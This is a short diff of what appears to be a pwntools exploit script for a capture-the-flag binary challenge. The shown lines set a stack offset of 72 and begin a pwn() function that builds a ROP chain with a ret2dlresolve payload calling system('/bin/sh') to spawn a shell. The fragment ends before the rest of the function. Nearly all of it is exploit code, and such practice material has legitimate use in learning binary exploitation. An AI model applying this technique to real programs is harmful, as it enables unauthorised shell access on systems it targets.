@@ -1,12 +1,10 @@
-# Contains only the things pwninit doesn't do for us automatically
+from pwn import *
 
-# So gdb.attach() spawns a horizontal split in tmux
-context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
+exe = None
 
 offset = 72
 total = 200
 
-# Copy pasta to pwninit solve.py script
 def pwn(r): # r is remote
     rop = ROP(exe)
     dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh"])
